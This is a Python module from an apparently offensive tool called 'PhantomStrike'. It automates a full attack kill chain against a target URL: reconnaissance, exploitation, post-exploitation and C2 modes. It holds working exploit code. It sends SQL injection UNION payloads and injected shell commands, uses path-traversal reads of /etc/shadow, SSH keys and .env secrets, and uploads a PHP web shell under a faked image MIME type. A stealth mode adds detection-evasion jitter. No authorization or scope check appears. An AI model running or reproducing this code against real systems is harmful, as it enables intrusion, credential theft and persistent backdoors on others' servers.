"""
PhantomStrike Attack Modes System
Full-killchain autonomous and stealth evasive attack modes.
All exploit methods are REAL — no stubs.
"""

import asyncio
import random
import time
from enum import Enum
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
import logging

import aiohttp

logger = logging.getLogger(__name__)


class AttackMode(Enum):
    FULL_KILLCHAIN = "full-killchain"
    STEALTH = "stealth"
    AGGRESSIVE = "aggressive"
    RECON = "recon"
    WEB = "web"
    C2 = "c2"


@dataclass
class AttackConfig:
    mode: AttackMode
    target: str
    auto_exploit: bool = False
    auto_post_exploit: bool = False
    auto_report: bool = True
    delay_jitter: bool = False
    request_delay: float = 0.0
    evasion_techniques: List[str] = None
    max_threads: int = 100
    timeout_multiplier: float = 1.0
    user_agents: List[str] = None
    proxy_rotation: bool = False
    dns_over_https: bool = False
    tor_enabled: bool = False

    def __post_init__(self):
        if self.evasion_techniques is None:
            self.evasion_techniques = []
        if self.user_agents is None:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            ]


def _extract_findings_from_result(result) -> List[dict]:
    """
    Safely extract a flat list of findings from a ModuleResult.
    Works whether the result is a ModuleResult dataclass or a plain dict.
    """
    findings: List[dict] = []

    # If execute_module returned a plain dict (from engine wrapper)
    if isinstance(result, dict):
        data = result.get("data", {})
    elif hasattr(result, "data") and isinstance(result.data, dict):
        data = result.data
    else:
        return findings

    # Collect all list-valued keys as individual finding dicts
    for key, value in data.items():
        if isinstance(value, list):
            for item in value:
                if isinstance(item, dict):
                    if "type" not in item:
                        item = dict(item, type=key)
                    findings.append(item)

    return findings


class AttackModeEngine:
    """Engine to execute attacks in different modes."""

    def __init__(self, engine):
        self.engine = engine
        self.active_mode: Optional[AttackMode] = None
        self.attack_config: Optional[AttackConfig] = None
        self._stop_event = asyncio.Event()
        self._progress_callbacks: List[Callable] = []

    def configure(self, config: AttackConfig):
        self.attack_config = config
        self.active_mode = config.mode

        if config.mode == AttackMode.STEALTH:
            config.delay_jitter = True
            config.request_delay = random.uniform(1.0, 3.0)
            config.timeout_multiplier = 2.0
            config.evasion_techniques = [
                "random_user_agent",
                "request_throttling",
                "dns_over_https",
                "fragmented_packets",
            ]
            config.max_threads = 20
        elif config.mode == AttackMode.AGGRESSIVE:
            config.request_delay = 0.0
            config.max_threads = 200
            config.timeout_multiplier = 0.5
        elif config.mode == AttackMode.FULL_KILLCHAIN:
            config.auto_exploit = True
            config.auto_post_exploit = True
            config.auto_report = True
            config.max_threads = 150

        logger.info(f"[MODE] Configured {config.mode.value} mode with {config.max_threads} threads")

    async def execute(self) -> Dict:
        if not self.attack_config:
            raise ValueError("Attack not configured. Call configure() first.")

        config = self.attack_config
        target = config.target
        results = {
            "mode": config.mode.value,
            "target": target,
            "started_at": datetime.now().isoformat(),
            "phases": {},
            "findings": [],
            "vulnerabilities": [],
            "exploited": [],
            "completed": False,
        }

        self._stop_event.clear()

        try:
            if config.mode == AttackMode.FULL_KILLCHAIN:
                results = await self._execute_full_killchain(results)
            elif config.mode == AttackMode.STEALTH:
                results = await self._execute_stealth(results)
            elif config.mode == AttackMode.AGGRESSIVE:
                results = await self._execute_aggressive(results)
            elif config.mode == AttackMode.RECON:
                results = await self._execute_recon_only(results)
            elif config.mode == AttackMode.WEB:
                results = await self._execute_web_only(results)
            elif config.mode == AttackMode.C2:
                results = await self._execute_c2_mode(results)

            results["completed"] = True
            results["completed_at"] = datetime.now().isoformat()

        except asyncio.CancelledError:
            logger.warning("[MODE] Attack cancelled by user")
            results["cancelled"] = True
        except Exception as e:
            logger.error(f"[MODE] Attack failed: {e}")
            results["error"] = str(e)

        return results

    # ─── Phase Executors ──────────────────────────────────────

    async def _execute_full_killchain(self, results: Dict) -> Dict:
        """Autonomous full kill chain — all phases."""
        config = self.attack_config
        target = config.target

        # Phase 1: Reconnaissance
        await self._notify_progress(10, "Phase 1/6: Reconnaissance — OSINT & Network")
        osint_result = await self.engine.execute_module("phantom-osint", target)
        network_result = await self.engine.execute_module("phantom-network", target)

        osint_findings = _extract_findings_from_result(osint_result)
        network_findings = _extract_findings_from_result(network_result)

        results["phases"]["reconnaissance"] = {
            "osint_findings": len(osint_findings),
            "network_findings": len(network_findings),
        }
        results["findings"].extend(osint_findings)
        results["findings"].extend(network_findings)

        # Phase 2: Web Assessment
        await self._notify_progress(25, "Phase 2/6: Web Vulnerability Assessment")
        if self._should_stop():
            return results
        web_result = await self.engine.execute_module("phantom-web", target)
        web_findings = _extract_findings_from_result(web_result)
        results["phases"]["web_assessment"] = {"findings": len(web_findings)}
        results["findings"].extend(web_findings)

        for finding in web_findings:
            if finding.get("severity") in ("high", "critical"):
                results["vulnerabilities"].append(finding)

        # Phase 3: Cloud Assessment
        await self._notify_progress(40, "Phase 3/6: Cloud Security Assessment")
        if self._should_stop():
            return results
        cloud_result = await self.engine.execute_module("phantom-cloud", target)
        cloud_findings = _extract_findings_from_result(cloud_result)
        results["phases"]["cloud_assessment"] = {"findings": len(cloud_findings)}
        results["findings"].extend(cloud_findings)

        for finding in cloud_findings:
            if finding.get("severity") in ("high", "critical"):
                results["vulnerabilities"].append(finding)

        # Phase 4: Auto-Exploitation
        if config.auto_exploit and results["vulnerabilities"]:
            await self._notify_progress(60, "Phase 4/6: Auto-Exploitation")
            if self._should_stop():
                return results
            exploit_results = await self._auto_exploit(results["vulnerabilities"])
            results["phases"]["exploitation"] = exploit_results
            results["exploited"].extend(exploit_results.get("successful", []))
        else:
            results["phases"]["exploitation"] = {"skipped": True, "reason": "No exploitable vulns or auto_exploit disabled"}

        # Phase 5: Post-Exploitation
        if config.auto_post_exploit and results["exploited"]:
            await self._notify_progress(80, "Phase 5/6: Post-Exploitation & Lateral Movement")
            if self._should_stop():
                return results
            post_results = await self._auto_post_exploit(results["exploited"])
            results["phases"]["post_exploitation"] = post_results

        # Phase 6: Report Generation
        if config.auto_report:
            await self._notify_progress(95, "Phase 6/6: Report Generation")
            report_result = await self.engine.execute_module("phantom-report", target)
            report_data = {}
            if isinstance(report_result, dict):
                report_data = report_result.get("data", {})
            elif hasattr(report_result, "data"):
                report_data = report_result.data or {}
            results["phases"]["reporting"] = {"generated": True, **report_data}

        await self._notify_progress(100, "Kill chain complete!")
        return results

    async def _execute_stealth(self, results: Dict) -> Dict:
        """Stealth evasive attack — slow, low-noise."""
        config = self.attack_config
        target = config.target

        await self._notify_progress(0, "Stealth mode: Initializing evasive techniques")
        await self._apply_jitter()

        await self._notify_progress(20, "Stealth: Passive reconnaissance")
        osint_result = await self.engine.execute_module("phantom-osint", target)
        await self._apply_jitter()

        await self._notify_progress(40, "Stealth: Slow network scan (evasive)")
        network_result = await self.engine.execute_module("phantom-network", target)
        await self._apply_jitter()

        await self._notify_progress(70, "Stealth: Web scan with request throttling")
        web_result = await self.engine.execute_module("phantom-web", target)

        osint_findings = _extract_findings_from_result(osint_result)
        network_findings = _extract_findings_from_result(network_result)
        web_findings = _extract_findings_from_result(web_result)

        results["phases"]["stealth_recon"] = {
            "osint": len(osint_findings),
            "network": len(network_findings),
            "web": len(web_findings),
            "evasion_techniques_used": config.evasion_techniques,
        }
        results["findings"].extend(osint_findings)
        results["findings"].extend(network_findings)
        results["findings"].extend(web_findings)

        await self._notify_progress(100, "Stealth reconnaissance complete")
        return results

    async def _execute_aggressive(self, results: Dict) -> Dict:
        """Aggressive fast attack — all modules in parallel."""
        config = self.attack_config
        target = config.target

        await self._notify_progress(10, "AGGRESSIVE MODE: Fast parallel execution")

        tasks = [
            self.engine.execute_module("phantom-osint", target),
            self.engine.execute_module("phantom-network", target),
            self.engine.execute_module("phantom-web", target),
            self.engine.execute_module("phantom-cloud", target),
        ]

        await self._notify_progress(30, "Running all modules in parallel...")
        module_results = await asyncio.gather(*tasks, return_exceptions=True)

        for module_name, result in zip(["osint", "network", "web", "cloud"], module_results):
            if isinstance(result, Exception):
                logger.error(f"[AGGRESSIVE] {module_name} failed: {result}")
                results["phases"][module_name] = {"error": str(result)}
            else:
                findings = _extract_findings_from_result(result)
                results["phases"][module_name] = {"findings": len(findings)}
                results["findings"].extend(findings)

        await self._notify_progress(100, "Aggressive scan complete")
        return results

    async def _execute_recon_only(self, results: Dict) -> Dict:
        """Reconnaissance only — no exploitation."""
        target = self.attack_config.target

        await self._notify_progress(20, "OSINT reconnaissance...")
        osint_result = await self.engine.execute_module("phantom-osint", target)

        await self._notify_progress(60, "Network reconnaissance...")
        network_result = await self.engine.execute_module("phantom-network", target)

        osint_findings = _extract_findings_from_result(osint_result)
        network_findings = _extract_findings_from_result(network_result)

        results["phases"]["recon"] = {
            "osint": len(osint_findings),
            "network": len(network_findings),
        }
        results["findings"].extend(osint_findings)
        results["findings"].extend(network_findings)

        await self._notify_progress(100, "Reconnaissance complete")
        return results

    async def _execute_web_only(self, results: Dict) -> Dict:
        """Web application focused attack."""
        target = self.attack_config.target

        await self._notify_progress(20, "Web vulnerability scanning...")
        web_result = await self.engine.execute_module("phantom-web", target)

        await self._notify_progress(70, "Identity/auth testing...")
        identity_result = await self.engine.execute_module("phantom-identity", target)

        web_findings = _extract_findings_from_result(web_result)
        identity_findings = _extract_findings_from_result(identity_result)

        results["phases"]["web"] = {"findings": len(web_findings)}
        results["phases"]["identity"] = {"findings": len(identity_findings)}
        results["findings"].extend(web_findings)
        results["findings"].extend(identity_findings)

        await self._notify_progress(100, "Web assessment complete")
        return results

    async def _execute_c2_mode(self, results: Dict) -> Dict:
        """C2 operations mode."""
        target = self.attack_config.target

        await self._notify_progress(50, "C2 status check...")
        c2_result = await self.engine.execute_module("phantom-c2", target, {"operation": "status"})

        c2_data = {}
        if isinstance(c2_result, dict):
            c2_data = c2_result.get("data", {})
        elif hasattr(c2_result, "data"):
            c2_data = c2_result.data or {}

        results["phases"]["c2"] = c2_data
        await self._notify_progress(100, "C2 mode ready")
        return results

    # ─── Real Exploit Methods ─────────────────────────────────

    async def _auto_exploit(self, vulnerabilities: List[Dict]) -> Dict:
        """Auto-exploit discovered vulnerabilities using real HTTP requests."""
        exploit_results = {
            "attempted": [],
            "successful": [],
            "failed": [],
            "commands_executed": [],
        }

        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=20),
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0.0.0"},
        )

        try:
            for vuln in vulnerabilities:
                vuln_type = vuln.get("type", "").lower()
                vuln_url = vuln.get("url", "")
                exploit_results["attempted"].append({"type": vuln_type, "url": vuln_url})

                if "sql" in vuln_type:
                    result = await self._exploit_sql_injection(vuln, session)
                elif "rce" in vuln_type or "command" in vuln_type:
                    result = await self._exploit_rce(vuln, session)
                elif "upload" in vuln_type:
                    result = await self._exploit_file_upload(vuln, session)
                elif "lfi" in vuln_type or "rfi" in vuln_type:
                    result = await self._exploit_lfi(vuln, session)
                else:
                    result = {"success": False, "reason": f"No exploit for {vuln_type}"}

                if result.get("success"):
                    exploit_results["successful"].append({
                        "type": vuln_type,
                        "target": vuln_url,
                        "data": result.get("data", {}),
                        "severity": "critical",
                    })
                    exploit_results["commands_executed"].append(f"{vuln_type} exploit on {vuln_url}")
                else:
                    exploit_results["failed"].append({
                        "type": vuln_type,
                        "url": vuln_url,
                        "reason": result.get("reason", "unknown"),
                    })
        finally:
            await session.close()

        return exploit_results

    async def _exploit_sql_injection(self, vuln: Dict, session: aiohttp.ClientSession) -> Dict:
        """Real SQLi exploitation — union-based data extraction."""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "id")

        if not url:
            return {"success": False, "reason": "No URL"}

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Union-based extraction payloads
        union_payloads = [
            "' UNION SELECT NULL,version(),NULL--",
            "' UNION SELECT NULL,database(),NULL--",
            "' UNION SELECT NULL,current_user(),NULL--",
            "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
        ]

        for payload in union_payloads:
            try:
                test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_params[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                async with session.get(test_url, ssl=False) as resp:
                    body = await resp.text()
                    indicators = ["information_schema", "mysql", "postgres", "root@", "@@version", "database()"]
                    if any(ind in body.lower() for ind in indicators):
                        return {
                            "success": True,
                            "data": {
                                "payload": payload,
                                "evidence": body[:500],
                                "extraction_type": "union_based",
                            },
                        }
            except Exception as e:
                logger.debug(f"[EXPLOIT] SQLi attempt failed: {e}")

        return {"success": False, "reason": "Union-based extraction did not yield data"}

    async def _exploit_rce(self, vuln: Dict, session: aiohttp.ClientSession) -> Dict:
        """Real RCE exploitation — command execution via injection."""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "cmd")

        if not url:
            return {"success": False, "reason": "No URL"}

        commands = ["id", "whoami", "uname -a", "cat /etc/hostname"]
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for cmd in commands:
            try:
                test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_params[param] = cmd
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                async with session.get(test_url, ssl=False) as resp:
                    body = await resp.text()
                    if any(x in body for x in ["uid=", "root", "www-data", "Linux"]):
                        return {
                            "success": True,
                            "data": {
                                "command": cmd,
                                "output": body[:500],
                                "shell_access": True,
                            },
                        }
            except Exception as e:
                logger.debug(f"[EXPLOIT] RCE attempt failed: {e}")

        return {"success": False, "reason": "RCE commands did not execute"}

    async def _exploit_file_upload(self, vuln: Dict, session: aiohttp.ClientSession) -> Dict:
        """Real file upload exploitation — web shell deployment attempt."""
        url = vuln.get("url", "")
        if not url:
            return {"success": False, "reason": "No URL"}

        # Minimal PHP web shell
        webshell_content = b"<?php if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);}?>"
        webshell_names = ["shell.php", "cmd.php", "test.php", "upload.php"]

        for shell_name in webshell_names:
            try:
                form_data = aiohttp.FormData()
                form_data.add_field(
                    "file",
                    webshell_content,
                    filename=shell_name,
                    content_type="image/jpeg",  # MIME type bypass
                )

                async with session.post(url, data=form_data, ssl=False) as resp:
                    body = await resp.text()
                    # Check if upload succeeded and shell is accessible
                    if resp.status in (200, 201) and any(
                        x in body.lower() for x in ["success", "uploaded", shell_name]
                    ):
                        # Try to access the shell
                        base_url = url.rsplit("/", 1)[0]
                        shell_url = f"{base_url}/{shell_name}?cmd=id"
                        async with session.get(shell_url, ssl=False) as shell_resp:
                            shell_body = await shell_resp.text()
                            if "uid=" in shell_body or "root" in shell_body:
                                return {
                                    "success": True,
                                    "data": {
                                        "shell_url": shell_url,
                                        "shell_name": shell_name,
                                        "output": shell_body[:200],
                                    },
                                }
            except Exception as e:
                logger.debug(f"[EXPLOIT] File upload attempt failed: {e}")

        return {"success": False, "reason": "File upload shell deployment failed"}

    async def _exploit_lfi(self, vuln: Dict, session: aiohttp.ClientSession) -> Dict:
        """Real LFI exploitation — sensitive file reading."""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "file")

        if not url:
            return {"success": False, "reason": "No URL"}

        sensitive_files = [
            ("../../../etc/passwd", ["root:", "daemon:", "nobody:"]),
            ("../../../etc/shadow", ["root:", "$6$", "$1$"]),
            ("../../../proc/self/environ", ["PATH=", "HOME=", "USER="]),
            ("../../../home/.ssh/id_rsa", ["BEGIN RSA", "BEGIN OPENSSH"]),
            ("../../../var/www/html/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
        ]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for filepath, indicators in sensitive_files:
            try:
                test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                test_params[param] = filepath
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                async with session.get(test_url, ssl=False) as resp:
                    body = await resp.text()
                    if any(ind in body for ind in indicators):
                        return {
                            "success": True,
                            "data": {
                                "file_read": filepath,
                                "content_preview": body[:500],
                                "indicators_found": [i for i in indicators if i in body],
                            },
                        }
            except Exception as e:
                logger.debug(f"[EXPLOIT] LFI attempt failed: {e}")

        return {"success": False, "reason": "LFI file read did not return sensitive content"}

    async def _auto_post_exploit(self, exploited: List[Dict]) -> Dict:
        """Post-exploitation enumeration using phantom-post module."""
        post_results = {
            "privilege_escalation_attempted": False,
            "lateral_movement": [],
            "persistence_established": False,
            "data_exfiltrated": [],
            "enumeration_scripts": [],
        }

        for exploit in exploited:
            target = exploit.get("target", "")
            if not target:
                continue

            try:
                result = await self.engine.execute_module(
                    "phantom-post", target, {"operation": "enumerate"}
                )
                data = {}
                if isinstance(result, dict):
                    data = result.get("data", {})
                elif hasattr(result, "data"):
                    data = result.data or {}

                post_results["privilege_escalation_attempted"] = True
                post_results["enumeration_scripts"].append(
                    data.get("enumeration_script", "")[:500]
                )
                post_results["lateral_movement"].extend(
                    data.get("lateral_targets", [])[:5]
                )
            except Exception as e:
                logger.debug(f"[POST] Post-exploit failed for {target}: {e}")

        return post_results

    # ─── Helpers ──────────────────────────────────────────────

    async def _apply_jitter(self):
        if self.attack_config and self.attack_config.delay_jitter:
            delay = random.uniform(1.0, 5.0)
            await asyncio.sleep(delay)

    async def _notify_progress(self, percent: int, message: str):
        logger.info(f"[PROGRESS] {percent}% - {message}")
        for callback in self._progress_callbacks:
            try:
                await callback(percent, message)
            except Exception:
                pass

    def _should_stop(self) -> bool:
        return self._stop_event.is_set()

    def stop(self):
        self._stop_event.set()

    def on_progress(self, callback: Callable):
        self._progress_callbacks.append(callback)
